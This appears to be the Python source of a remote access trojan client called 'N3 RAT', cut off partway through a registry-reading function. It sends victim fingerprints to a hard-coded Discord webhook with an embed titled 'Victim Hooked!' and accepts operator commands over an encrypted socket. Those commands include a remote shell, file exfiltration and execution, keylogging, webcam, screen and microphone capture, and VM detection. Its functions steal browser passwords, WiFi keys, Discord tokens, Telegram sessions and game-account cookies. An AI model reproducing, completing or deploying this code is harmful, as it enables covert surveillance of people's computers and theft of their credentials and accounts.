#!/usr/bin/env python3
import sys, os, socket, ssl, struct, json, base64, zlib, hashlib, hmac
import subprocess, threading, time, io, ctypes, tempfile, urllib.request, sqlite3, shutil, re, random, ctypes.wintypes
from queue import Queue, Empty
from typing import Optional, Dict, List, Tuple

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2

# cnfg
SERVER_IP = "127.0.0.1"
SERVER_PORT = 4444
AUTH_TOKEN = "SecretToken123"
MASTER_PASSWORD = "ChangeMeNow!"
WEBHOOK_URL = "https://discord.com/api/webhooks/1517529253044944919/qk9NFcbTNvb4hhBzhNfs8GM0GRlJltTz_gVez-JW7lb95Be2NfAsEzaFEbIQTO97H2Y5"
# SSL/TLS certs (if server uses SSL, provide client cert/key and CA)
CLIENT_CERT = "client.crt"
CLIENT_KEY = "client.key"
CA_CERT = "ca.crt"
USE_SSL = False
# cnfgend

AES_BLOCK_SIZE = 16
INT_LEN = 4
HMAC_SIZE = 32
FILE_CHUNK_SIZE = 65536
HEARTBEAT_INTERVAL = 5.0
HEARTBEAT_TIMEOUT = 30.0
OFFLINE_QUEUE_FILE = "offline_commands.json"

def derive_key(password: str, salt: bytes) -> bytes:
    return PBKDF2(password, salt, dkLen=32, count=100000)

MASTER_ENC_KEY = derive_key(MASTER_PASSWORD, b'RatServerSalt1234')
MASTER_MAC_KEY = derive_key(MASTER_PASSWORD, b'RatServerMacSalt12')

def encrypt_data_aes256(data: bytes, key: bytes) -> bytes:
    iv = get_random_bytes(AES_BLOCK_SIZE)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(data, AES_BLOCK_SIZE))
    return iv + ct

def decrypt_data_aes256(data: bytes, key: bytes) -> bytes:
    iv = data[:AES_BLOCK_SIZE]
    ct = data[AES_BLOCK_SIZE:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES_BLOCK_SIZE)

def generate_hmac(key: bytes, data: bytes) -> bytes:
    return hmac.new(key, data, hashlib.sha256).digest()

def verify_hmac(key: bytes, data: bytes, mac: bytes) -> bool:
    return hmac.compare_digest(generate_hmac(key, data), mac)

def secure_pack(plain: bytes, enc_key: bytes, mac_key: bytes) -> bytes:
    ct = encrypt_data_aes256(plain, enc_key)
    mac = generate_hmac(mac_key, ct)
    return struct.pack('>I', len(ct)) + ct + mac

def secure_unpack(sock: socket.socket, enc_key: bytes, mac_key: bytes) -> Optional[bytes]:
    raw_len = recv_all(sock, INT_LEN)
    if not raw_len:
        return None
    ct_len = struct.unpack('>I', raw_len)[0]
    if ct_len > 100 * 1024 * 1024:
        return None
    ct = recv_all(sock, ct_len)
    mac = recv_all(sock, HMAC_SIZE)
    if ct is None or mac is None:
        return None
    if not verify_hmac(mac_key, ct, mac):
        return None
    return decrypt_data_aes256(ct, enc_key)

def recv_all(sock: socket.socket, n: int) -> Optional[bytes]:
    data = b''
    while len(data) < n:
        try:
            packet = sock.recv(n - len(data))
            if not packet:
                return None
            data += packet
        except socket.timeout:
            return None
    return data

# webifno
def get_external_ip() -> str:
    try:
        return urllib.request.urlopen('https://api.ipify.org', timeout=3).read().decode()
    except:
        return 'unknown'

def get_local_ips() -> List[str]:
    ips = []
    try:
        import socket
        hostname = socket.gethostname()
        ips.append(socket.gethostbyname(hostname))
        for info in socket.getaddrinfo(hostname, None):
            ip = info[4][0]
            if ip not in ips:
                ips.append(ip)
    except:
        pass
    return ips

def get_dns_info() -> List[str]:
    dns_servers = []
    try:
        # Windows
        output = subprocess.check_output('ipconfig /all', shell=True).decode('utf-8', errors='ignore')
        for line in output.splitlines():
            if 'DNS Servers' in line:
                # Extract IP
                parts = line.split(':')
                if len(parts) > 1:
                    dns_servers.append(parts[1].strip())
    except:
        pass
    return dns_servers

def get_desktop_name() -> str:
    return os.environ.get('COMPUTERNAME', 'unknown')

def is_vpn() -> bool:
    # Simple heuristic: check for known VPN adapters
    try:
        output = subprocess.check_output('ipconfig /all', shell=True).decode('utf-8', errors='ignore')
        vpn_keywords = ['VPN', 'TAP', 'TUNNEL', 'PPTP', 'L2TP']
        for line in output.splitlines():
            if any(kw in line.upper() for kw in vpn_keywords):
                return True
    except:
        pass
    # Check public IP vs ISP? Hard; return False by default
    return False

def is_vm() -> bool:
    # VM Detect
    vm_indicators = [
        'hypervisor', 'vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'vbox'
    ]
    try:
        # Check sys info
        output = subprocess.check_output('systeminfo', shell=True).decode('utf-8', errors='ignore')
        low = output.lower()
        for ind in vm_indicators:
            if ind in low:
                return True
    except:
        pass
    # Check MAC prefixes
    try:
        import uuid
        mac = uuid.getnode()
        # Known OUI for VMware, VirtualBox, etc.
        oui = mac >> 24
        if oui in [0x000C29, 0x000569, 0x080027, 0x001C42, 0x001C42]:
            return True
    except:
        pass
    return False

def get_webhook_info():
    info = {
        "Desktop Name": get_desktop_name(),
        "External IP": get_external_ip(),
        "Local IPs": get_local_ips(),
        "DNS Servers": get_dns_info(),
        "Hostname": socket.gethostname(),
        "OS": f"{sys.platform} {os.name}",
        "Platform": '',
        "CPU Cores": os.cpu_count(),
        "RAM Total": '',
        "VPN Detected": is_vpn(),
        "VM Detected": is_vm()
    }
    try:
        import platform
        info["Platform"] = platform.platform()
        info["Processor"] = platform.processor()
    except:
        pass
    try:
        import psutil
        info["RAM Total"] = f"{psutil.virtual_memory().total / (1024**3):.1f} GB"
    except:
        pass
    return info

def send_webhook(info: Dict):
    """Send Discord webhook with detailed embed."""
    description = "\n".join([f"**{k}:** {v}" for k, v in info.items()])
    payload = {
        "username": "N3 RAT Hook",
        "embeds": [
            {
                "title": "🔔 Victim Hooked!",
                "description": description,
                "color": 16711680,
                "footer": {"text": "N3 RAT"}
            }
        ]
    }
    try:
        import requests
        requests.post(WEBHOOK_URL, json=payload, timeout=5)
    except ImportError:
        try:
            data = json.dumps(payload).encode()
            req = urllib.request.Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req, timeout=5)
        except:
            pass
    except Exception:
        pass

def get_location() -> Tuple[float, float]:
    try:
        with urllib.request.urlopen('http://ip-api.com/json/', timeout=5) as resp:
            data = json.loads(resp.read().decode())
            return float(data.get('lat', 0.0)), float(data.get('lon', 0.0))
    except:
        return 0.0, 0.0

# ---------- Offline Command Queue ----------
class OfflineQueue:
    def __init__(self, file_path=OFFLINE_QUEUE_FILE):
        self.file_path = file_path
        self.queue = []
        self.load()

    def load(self):
        if os.path.exists(self.file_path):
            try:
                with open(self.file_path, 'r') as f:
                    self.queue = json.load(f)
            except:
                self.queue = []

    def save(self):
        try:
            with open(self.file_path, 'w') as f:
                json.dump(self.queue, f)
        except:
            pass

    def put(self, item):
        self.queue.append(item)
        self.save()

    def get_all(self):
        items = self.queue[:]
        self.queue.clear()
        self.save()
        return items

    def is_empty(self):
        return len(self.queue) == 0

offline_queue = OfflineQueue()

# ---------- Crash Recovery ----------
def start_crash_recovery():
    """Watchdog thread that restarts the main client if it dies."""
    def watchdog():
        while True:
            time.sleep(60)
            # Check if main thread is alive (simple: check a global flag)
            if not main_thread_alive.is_set():
                # Restart process
                os.execv(sys.executable, [sys.executable] + sys.argv)
    t = threading.Thread(target=watchdog, daemon=True)
    t.start()

main_thread_alive = threading.Event()
main_thread_alive.set()

# ---------- Command Handler ----------
class CommandHandler:
    def __init__(self, sock: socket.socket, enc_key: bytes, mac_key: bytes):
        self.sock = sock
        self.enc_key = enc_key
        self.mac_key = mac_key
        self.keylogger_active = False
        self.keylog_buffer = []
        self.webcam_active = False
        self.screen_active = False
        self.screenshot_scheduler_active = False
        self.clipboard_monitor_active = False
        self.microphone_active = False
        self.offline_queue = offline_queue
        self.webcam_thread = None
        self.screen_thread = None
        self.keylog_thread = None
        self.screenshot_scheduler_thread = None
        self.clipboard_monitor_thread = None
        self.microphone_thread = None

    def send_response(self, resp_type: str, data: bytes = b'', cmd_id: int = 0, compress: bool = False):
        if compress:
            data = zlib.compress(data)
        type_bytes = resp_type.encode('utf-8')
        payload = struct.pack('>I', len(type_bytes)) + type_bytes
        payload += struct.pack('>I', cmd_id)
        payload += struct.pack('>I', len(data)) + data
        try:
            packed = secure_pack(payload, self.enc_key, self.mac_key)
            self.sock.sendall(packed)
        except Exception:
            # Offline? Store in queue
            self.offline_queue.put({'type': resp_type, 'data': base64.b64encode(data).decode(), 'cmd_id': cmd_id})

    def handle_command(self, msg: bytes):
        if len(msg) < 12:
            return
        offset = 0
        cmd_type_len = struct.unpack('>I', msg[offset:offset+4])[0]; offset += 4
        cmd_type = msg[offset:offset+cmd_type_len].decode('utf-8'); offset += cmd_type_len
        cmd_id = struct.unpack('>I', msg[offset:offset+4])[0]; offset += 4
        data_len = struct.unpack('>I', msg[offset:offset+4])[0]; offset += 4
        data = msg[offset:offset+data_len]

        # Decompress data if needed (server may compress certain commands)
        try:
            data = zlib.decompress(data)
        except:
            pass

        handler = getattr(self, f'cmd_{cmd_type}', None)
        if handler:
            try:
                # Run long commands in separate thread
                if cmd_type in ['stress_cpu', 'stress_ram', 'stress_gpu', 'file_search', 'network_test', 'inject_process', 'microphone']:
                    threading.Thread(target=handler, args=(cmd_id, data), daemon=True).start()
                else:
                    handler(cmd_id, data)
            except Exception as e:
                self.send_response('error', f"Handler error: {e}".encode(), cmd_id)
        else:
            self.send_response('error', f"Unknown cmd: {cmd_type}".encode(), cmd_id)

    # ---------- Basic commands ----------
    def cmd_heartbeat(self, cmd_id, data):
        self.send_response('heartbeat', b'', cmd_id)

    def cmd_start_webcam(self, cmd_id, data):
        if not self.webcam_active:
            self.webcam_active = True
            self.webcam_thread = threading.Thread(target=self._webcam_stream, args=(cmd_id,), daemon=True)
            self.webcam_thread.start()
            self.send_response('error', b'Webcam started', cmd_id)

    def cmd_stop_webcam(self, cmd_id, data):
        self.webcam_active = False
        self.send_response('error', b'Webcam stopped', cmd_id)

    def cmd_start_screen(self, cmd_id, data):
        if not self.screen_active:
            interval = struct.unpack('>I', data)[0] if len(data) >= 4 else 500
            self.screen_active = True
            self.screen_thread = threading.Thread(target=self._screen_stream, args=(interval, cmd_id), daemon=True)
            self.screen_thread.start()
            self.send_response('error', b'Screen started', cmd_id)

    def cmd_stop_screen(self, cmd_id, data):
        self.screen_active = False
        self.send_response('error', b'Screen stopped', cmd_id)

    def cmd_start_screenshot_scheduler(self, cmd_id, data):
        interval = struct.unpack('>I', data)[0] if len(data) >= 4 else 60
        self.screenshot_scheduler_active = True
        self.screenshot_scheduler_thread = threading.Thread(target=self._screenshot_scheduler, args=(interval, cmd_id), daemon=True)
        self.screenshot_scheduler_thread.start()
        self.send_response('error', b'Screenshot scheduler started', cmd_id)

    def cmd_stop_screenshot_scheduler(self, cmd_id, data):
        self.screenshot_scheduler_active = False
        self.send_response('error', b'Screenshot scheduler stopped', cmd_id)

    def cmd_start_keylog(self, cmd_id, data):
        if not self.keylogger_active:
            self.keylogger_active = True
            self.keylog_buffer = []
            self.keylog_thread = threading.Thread(target=self._keylogger_capture, daemon=True)
            self.keylog_thread.start()
            self.send_response('error', b'Keylogger started', cmd_id)

    def cmd_stop_keylog(self, cmd_id, data):
        self.keylogger_active = False
        self.send_response('error', b'Keylogger stopped', cmd_id)

    def cmd_get_keylog(self, cmd_id, data):
        log_text = '\n'.join(self.keylog_buffer)
        self.send_response('keylog', log_text.encode('utf-8', errors='ignore'), cmd_id)

    def cmd_start_clipboard_monitor(self, cmd_id, data):
        if not self.clipboard_monitor_active:
            self.clipboard_monitor_active = True
            self.clipboard_monitor_thread = threading.Thread(target=self._clipboard_monitor, daemon=True)
            self.clipboard_monitor_thread.start()
            self.send_response('error', b'Clipboard monitor started', cmd_id)

    def cmd_stop_clipboard_monitor(self, cmd_id, data):
        self.clipboard_monitor_active = False
        self.send_response('error', b'Clipboard monitor stopped', cmd_id)

    def cmd_get_sysinfo(self, cmd_id, data):
        info = {
            'hostname': os.environ.get('COMPUTERNAME', ''),
            'os': f"{os.name} {sys.platform}",
            'username': os.environ.get('USERNAME', ''),
            'cwd': os.getcwd(),
            'pid': os.getpid(),
            'local_ip': 'unknown',
            'external_ip': get_external_ip(),
            'cpu': 'unknown',
            'ram_total': 'unknown',
            'gpu': 'unknown'
        }
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            info['local_ip'] = s.getsockname()[0]
            s.close()
        except:
            pass
        try:
            import platform
            info['platform'] = platform.platform()
            info['machine'] = platform.machine()
            info['processor'] = platform.processor()
        except:
            pass
        try:
            import psutil
            info['cpu'] = f"{psutil.cpu_count(logical=False)} cores / {psutil.cpu_count()} threads"
            info['ram_total'] = f"{psutil.virtual_memory().total / (1024**3):.1f} GB"
        except:
            pass
        try:
            gpu = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode()
            gpu_lines = [line.strip() for line in gpu.splitlines() if line.strip() and 'Name' not in line]
            info['gpu'] = ', '.join(gpu_lines) if gpu_lines else 'unknown'
        except:
            pass
        self.send_response('sysinfo', json.dumps(info).encode(), cmd_id)

    def cmd_get_detailed_sysinfo(self, cmd_id, data):
        try:
            import psutil
            info = {
                'CPU Usage': psutil.cpu_percent(interval=1),
                'CPU Cores': psutil.cpu_count(),
                'RAM Used': f"{psutil.virtual_memory().used / (1024**3):.1f} GB",
                'RAM Total': f"{psutil.virtual_memory().total / (1024**3):.1f} GB",
                'Disk Usage': []
            }
            for part in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                    info['Disk Usage'].append({
                        'device': part.device,
                        'mountpoint': part.mountpoint,
                        'total': usage.total,
                        'used': usage.used,
                        'percent': usage.percent
                    })
                except:
                    pass
            self.send_response('detailed_sysinfo', json.dumps(info).encode(), cmd_id)
        except ImportError:
            self.send_response('error', b'psutil missing', cmd_id)

    def cmd_network_test(self, cmd_id, data):
        test_type = data.decode()
        result = {}
        if test_type == 'ping':
            try:
                output = subprocess.check_output('ping -n 4 8.8.8.8', shell=True).decode()
                result['ping'] = output
            except:
                result['ping'] = 'Ping failed'
        elif test_type == 'dns':
            try:
                ips = socket.gethostbyname_ex('google.com')
                result['dns'] = ips
            except:
                result['dns'] = 'DNS lookup failed'
        elif test_type == 'speed':
            # Simple speed test by downloading a small file
            try:
                start = time.time()
                urllib.request.urlretrieve('http://speedtest.tele2.net/1MB.zip', tempfile.gettempdir() + '/1MB.zip')
                end = time.time()
                os.remove(tempfile.gettempdir() + '/1MB.zip')
                duration = end - start
                result['speed'] = f"Downloaded 1MB in {duration:.2f} seconds"
            except:
                result['speed'] = 'Speed test failed'
        self.send_response('network_info', json.dumps(result).encode(), cmd_id)

    # ---------- File operations ----------
    def cmd_list_files(self, cmd_id, data):
        path = data.decode().strip()
        if not path:
            path = 'C:\\'
        try:
            items = []
            with os.scandir(path) as it:
                for entry in it:
                    is_dir = entry.is_dir()
                    size = 0 if is_dir else entry.stat().st_size
                    items.append([entry.name, is_dir, size])
            self.send_response('file_list', json.dumps({'path': path, 'items': items}).encode(), cmd_id)
        except PermissionError:
            self.send_response('error', b'Access denied', cmd_id)
        except Exception as e:
            self.send_response('error', f"List failed: {e}".encode(), cmd_id)

    def cmd_download_file(self, cmd_id, data):
        file_path = data.decode()
        try:
            if not os.path.isfile(file_path):
                self.send_response('error', b'Not a file', cmd_id)
                return
            total_size = os.path.getsize(file_path)
            total_chunks = (total_size // FILE_CHUNK_SIZE) + (1 if total_size % FILE_CHUNK_SIZE else 0)
            with open(file_path, 'rb') as f:
                chunk_idx = 0
                while True:
                    chunk = f.read(FILE_CHUNK_SIZE)
                    if not chunk:
                        break
                    payload = json.dumps({
                        'filename': os.path.basename(file_path),
                        'chunk': chunk_idx,
                        'total': total_chunks,
                        'data': base64.b64encode(chunk).decode('ascii')
                    }).encode()
                    self.send_response('file_download_chunk', payload, cmd_id, compress=True)
                    chunk_idx += 1
        except Exception as e:
            self.send_response('error', f"Download error: {e}".encode(), cmd_id)

    def cmd_upload_file(self, cmd_id, data):
        try:
            obj = json.loads(data.decode())
            filepath = obj['filename']
            content = base64.b64decode(obj['content_b64'])
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            with open(filepath, 'wb') as f:
                f.write(content)
            self.send_response('error', b'Upload OK', cmd_id)
        except Exception as e:
            self.send_response('error', f"Upload error: {e}".encode(), cmd_id)

    def cmd_execute_file(self, cmd_id, data):
        path = data.decode()
        try:
            os.startfile(path)
        except Exception as e:
            self.send_response('error', f"Execute error: {e}".encode(), cmd_id)

    def cmd_delete_file(self, cmd_id, data):
        path = data.decode()
        try:
            os.remove(path)
            self.send_response('error', b'Deleted', cmd_id)
        except Exception as e:
            self.send_response('error', f"Delete error: {e}".encode(), cmd_id)

    def cmd_shell_exec(self, cmd_id, data):
        cmd = data.decode()
        try:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            out, _ = proc.communicate(timeout=10)
            self.send_response('shell_output', out.encode(), cmd_id)
        except subprocess.TimeoutExpired:
            proc.kill()
            self.send_response('shell_output', b'Timed out', cmd_id)
        except Exception as e:
            self.send_response('shell_output', f"Error: {e}".encode(), cmd_id)

    def cmd_list_processes(self, cmd_id, data):
        try:
            import psutil
            plist = [(p.pid, p.name()) for p in psutil.process_iter(['pid', 'name'])]
        except ImportError:
            out = subprocess.check_output('tasklist /fo csv /nh', shell=True).decode()
            plist = []
            for line in out.splitlines():
                parts = line.split(',')
                if len(parts) >= 2:
                    plist.append((int(parts[1].strip('"')), parts[0].strip('"')))
        self.send_response('process_list', json.dumps(plist).encode(), cmd_id)

    def cmd_kill_process(self, cmd_id, data):
        pid = struct.unpack('>I', data[:4])[0]
        try:
            import psutil
            psutil.Process(pid).terminate()
        except:
            os.system(f'taskkill /PID {pid} /F')
        self.send_response('error', b'Process killed', cmd_id)

    def cmd_inject_process(self, cmd_id, data):
        pid = struct.unpack('>I', data[:4])[0]
        # Stub: implement actual injection if needed
        self.send_response('error', b'Process injection not fully implemented', cmd_id)

    # ---------- Clipboard ----------
    def cmd_get_clipboard(self, cmd_id, data):
        try:
            import pyperclip
            text = pyperclip.paste()
            self.send_response('clipboard_data', text.encode(), cmd_id)
        except:
            self.send_response('error', b'Clipboard failed', cmd_id)

    def cmd_set_clipboard(self, cmd_id, data):
        try:
            import pyperclip
            pyperclip.copy(data.decode())
            self.send_response('error', b'Clipboard set', cmd_id)
        except:
            self.send_response('error', b'Clipboard failed', cmd_id)

    def _clipboard_monitor(self):
        import pyperclip
        last = ""
        while self.clipboard_monitor_active:
            try:
                current = pyperclip.paste()
                if current != last:
                    last = current
                    self.send_response('clipboard_data', current.encode(), 0)
            except:
                pass
            time.sleep(1)

    # ---------- Audio ----------
    def cmd_start_mic(self, cmd_id, data):
        if not self.microphone_active:
            self.microphone_active = True
            self.microphone_thread = threading.Thread(target=self._microphone_stream, args=(cmd_id,), daemon=True)
            self.microphone_thread.start()
            self.send_response('error', b'Microphone started', cmd_id)

    def cmd_stop_mic(self, cmd_id, data):
        self.microphone_active = False
        self.send_response('error', b'Microphone stopped', cmd_id)

    def _microphone_stream(self, cmd_id):
        try:
            import pyaudio
            import wave
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
            while self.microphone_active:
                frames = []
                for _ in range(0, int(RATE / CHUNK * 1)):  # 1 second
                    data = stream.read(CHUNK)
                    frames.append(data)
                audio_data = b''.join(frames)
                # Send as wave file
                wav_buffer = io.BytesIO()
                with wave.open(wav_buffer, 'wb') as wf:
                    wf.setnchannels(CHANNELS)
                    wf.setsampwidth(p.get_sample_size(FORMAT))
                    wf.setframerate(RATE)
                    wf.writeframes(audio_data)
                self.send_response('microphone_data', wav_buffer.getvalue(), cmd_id, compress=True)
            stream.stop_stream()
            stream.close()
            p.terminate()
        except:
            self.send_response('error', b'Microphone error', cmd_id)

    # ---------- Power ----------
    def cmd_shutdown(self, cmd_id, data):
        os.system('shutdown /s /t 0')

    def cmd_restart(self, cmd_id, data):
        os.system('shutdown /r /t 0')

    def cmd_logoff(self, cmd_id, data):
        os.system('shutdown /l')

    def cmd_lock(self, cmd_id, data):
        ctypes.windll.user32.LockWorkStation()

    # ---------- Fun ----------
    def cmd_message_box(self, cmd_id, data):
        text = data.decode()
        try:
            ctypes.windll.user32.MessageBoxW(0, text, "Message", 0)
        except:
            pass

    def cmd_open_cd(self, cmd_id, data):
        try:
            ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
        except:
            pass

    def cmd_flip_screen(self, cmd_id, data):
        try:
            import rotatescreen
            screen = rotatescreen.get_primary_display()
            screen.set_orientation((screen.current_orientation + 180) % 360)
        except:
            pass

    def cmd_play_sound(self, cmd_id, data):
        try:
            obj = json.loads(data.decode())
            tmp = os.path.join(tempfile.gettempdir(), 'ratsound.wav')
            with open(tmp, 'wb') as f:
                f.write(base64.b64decode(obj['content_b64']))
            import winsound
            winsound.PlaySound(tmp, winsound.SND_FILENAME)
            os.unlink(tmp)
        except:
            pass

    def cmd_set_wallpaper(self, cmd_id, data):
        url = data.decode()
        try:
            tmp = os.path.join(tempfile.gettempdir(), 'ratwallpaper.jpg')
            urllib.request.urlretrieve(url, tmp)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, tmp, 3)
        except:
            pass

    def cmd_set_volume(self, cmd_id, data):
        level = struct.unpack('>I', data[:4])[0]
        try:
            from ctypes import cast, POINTER
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            vol = cast(interface, POINTER(IAudioEndpointVolume))
            vol.SetMasterVolumeLevelScalar(level/100.0, None)
        except:
            pass

    def cmd_mute(self, cmd_id, data):
        try:
            from ctypes import cast, POINTER
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            vol = cast(interface, POINTER(IAudioEndpointVolume))
            vol.SetMute(1, None)
        except:
            pass

    def cmd_move_mouse(self, cmd_id, data):
        try:
            x, y = struct.unpack('>II', data[:8])
            import pyautogui
            pyautogui.moveTo(x, y)
        except:
            pass

    def cmd_mouse_click(self, cmd_id, data):
        try:
            import pyautogui
            pyautogui.click()
        except:
            pass

    def cmd_keyboard_type(self, cmd_id, data):
        try:
            import pyautogui
            pyautogui.typewrite(data.decode())
        except:
            pass

    def cmd_shake_mouse(self, cmd_id, data):
        try:
            import pyautogui
            for _ in range(20):
                pyautogui.moveRel(random.randint(-50, 50), random.randint(-50, 50), duration=0.05)
        except:
            pass

    def cmd_open_random_site(self, cmd_id, data):
        import webbrowser
        sites = [
            'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
            'https://www.google.com',
            'https://www.reddit.com',
            'https://www.wikipedia.org'
        ]
        webbrowser.open(random.choice(sites))

    def cmd_beep_sound(self, cmd_id, data):
        try:
            import winsound
            winsound.Beep(1000, 500)
        except:
            pass

    def cmd_slow_mouse(self, cmd_id, data):
        try:
            import pyautogui
            original_speed = pyautogui.PAUSE
            pyautogui.PAUSE = 0.5
            time.sleep(5)
            pyautogui.PAUSE = original_speed
        except:
            pass

    def cmd_invert_mouse(self, cmd_id, data):
        try:
            ctypes.windll.user32.SwapMouseButton(1)
            time.sleep(5)
            ctypes.windll.user32.SwapMouseButton(0)
        except:
            pass

    # ---------- Steal ----------
    def cmd_steal_browser_passwords(self, cmd_id, data):
        try:
            import browser_cookie3
            results = {}
            for name, loader in [('chrome', browser_cookie3.chrome), ('firefox', browser_cookie3.firefox),
                                 ('edge', browser_cookie3.edge), ('brave', browser_cookie3.brave)]:
                try:
                    results[name] = self._decrypt_chrome_passwords(name)
                except:
                    results[name] = []
            self.send_response('browser_passwords', json.dumps(results).encode(), cmd_id)
        except ImportError:
            self.send_response('error', b'browser_cookie3 missing', cmd_id)

    def _decrypt_chrome_passwords(self, browser_name):
        paths = {
            'chrome': os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data',
            'edge': os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default\Login Data',
            'brave': os.path.expanduser('~') + r'\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data',
            'opera': os.path.expanduser('~') + r'\AppData\Roaming\Opera Software\Opera Stable\Login Data'
        }
        db_path = paths.get(browser_name, '')
        if not os.path.exists(db_path):
            return []
        try:
            shutil.copy2(db_path, tempfile.gettempdir() + f'\\{browser_name}_temp')
            conn = sqlite3.connect(tempfile.gettempdir() + f'\\{browser_name}_temp')
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()
            conn.close()
            os.remove(tempfile.gettempdir() + f'\\{browser_name}_temp')
            results = []
            for url, user, pwd in rows:
                if user and pwd:
                    try:
                        import win32crypt
                        decrypted = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1].decode()
                    except:
                        decrypted = "(encrypted)"
                    results.append({'url': url, 'user': user, 'password': decrypted})
            return results
        except:
            return []

    def cmd_steal_browser_history(self, cmd_id, data):
        try:
            history = []
            path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
            if os.path.exists(path):
                shutil.copy2(path, tempfile.gettempdir() + '\\chrome_history_temp')
                conn = sqlite3.connect(tempfile.gettempdir() + '\\chrome_history_temp')
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                for row in cursor.fetchall():
                    history.append({'url': row[0], 'title': row[1]})
                conn.close()
                os.remove(tempfile.gettempdir() + '\\chrome_history_temp')
            self.send_response('browser_history', json.dumps(history).encode(), cmd_id)
        except:
            self.send_response('error', b'History grab failed', cmd_id)

    def cmd_steal_wifi_passwords(self, cmd_id, data):
        try:
            data = subprocess.check_output('netsh wlan show profiles', shell=True).decode()
            profiles = [line.split(':')[1].strip() for line in data.splitlines() if "All User Profile" in line]
            wifi_list = []
            for profile in profiles:
                try:
                    results = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True).decode()
                    password = [line.split(':')[1].strip() for line in results.splitlines() if "Key Content" in line]
                    wifi_list.append({'ssid': profile, 'password': password[0] if password else ''})
                except:
                    pass
            self.send_response('wifi_passwords', json.dumps(wifi_list).encode(), cmd_id)
        except:
            self.send_response('error', b'WiFi grab failed', cmd_id)

    def cmd_grab_discord_token(self, cmd_id, data):
        try:
            token = ""
            discord_path = os.path.expanduser('~') + r'\AppData\Roaming\Discord\Local Storage\leveldb'
            if os.path.exists(discord_path):
                for file in os.listdir(discord_path):
                    if file.endswith('.log') or file.endswith('.ldb'):
                        with open(os.path.join(discord_path, file), 'r', errors='ignore') as f:
                            matches = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', f.read())
                            if matches:
                                token = matches[0]
                                break
            self.send_response('discord_token', token.encode(), cmd_id)
        except:
            self.send_response('error', b'Discord grab failed', cmd_id)

    def cmd_grab_telegram_session(self, cmd_id, data):
        try:
            path = os.path.expanduser('~') + r'\AppData\Roaming\Telegram Desktop\tdata'
            if os.path.exists(path):
                files = []
                for root, dirs, files_list in os.walk(path):
                    for file in files_list:
                        files.append(os.path.join(root, file))
                self.send_response('telegram_session', json.dumps({'files': files}).encode(), cmd_id)
            else:
                self.send_response('error', b'Telegram not found', cmd_id)
        except:
            self.send_response('error', b'Telegram grab failed', cmd_id)

    def cmd_steal_steam_ssfn(self, cmd_id, data):
        try:
            steam_path = r'C:\Program Files (x86)\Steam'
            ssfn_files = []
            if os.path.exists(steam_path):
                for f in os.listdir(steam_path):
                    if f.startswith('ssfn'):
                        ssfn_files.append(f)
            self.send_response('steam_ssfn', json.dumps(ssfn_files).encode(), cmd_id)
        except:
            self.send_response('error', b'Steam SSFN grab failed', cmd_id)

    def cmd_steal_roblox_cookies(self, cmd_id, data):
        try:
            import browser_cookie3
            cookies = browser_cookie3.load()
            roblox = []
            for c in cookies:
                if '.roblox.com' in c.domain and c.name == '.ROBLOSECURITY':
                    roblox.append({'domain': c.domain, 'value': c.value})
            self.send_response('roblox_cookies', json.dumps(roblox).encode(), cmd_id)
        except ImportError:
            self.send_response('error', b'browser_cookie3 missing', cmd_id)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_steal_minecraft_launcher(self, cmd_id, data):
        try:
            launcher_path = os.path.expanduser('~') + r'\AppData\Roaming\.minecraft\launcher_profiles.json'
            if os.path.exists(launcher_path):
                with open(launcher_path, 'r') as f:
                    content = f.read()
                self.send_response('minecraft_launcher', content.encode(), cmd_id)
            else:
                self.send_response('error', b'Minecraft not found', cmd_id)
        except:
            self.send_response('error', b'Minecraft grab failed', cmd_id)

    def cmd_grab_file(self, cmd_id, data):
        file_path = data.decode()
        try:
            if os.path.isfile(file_path):
                with open(file_path, 'rb') as f:
                    content = f.read()
                payload = json.dumps({
                    'filename': os.path.basename(file_path),
                    'content_b64': base64.b64encode(content).decode('ascii')
                }).encode()
                self.send_response('generic_file', payload, cmd_id, compress=True)
            else:
                self.send_response('error', b'File not found', cmd_id)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    # ---------- Control ----------
    def cmd_read_registry(self, cmd_id, data):
        key_path = data.decode()
        try:
            import winreg
            root_key_map = {
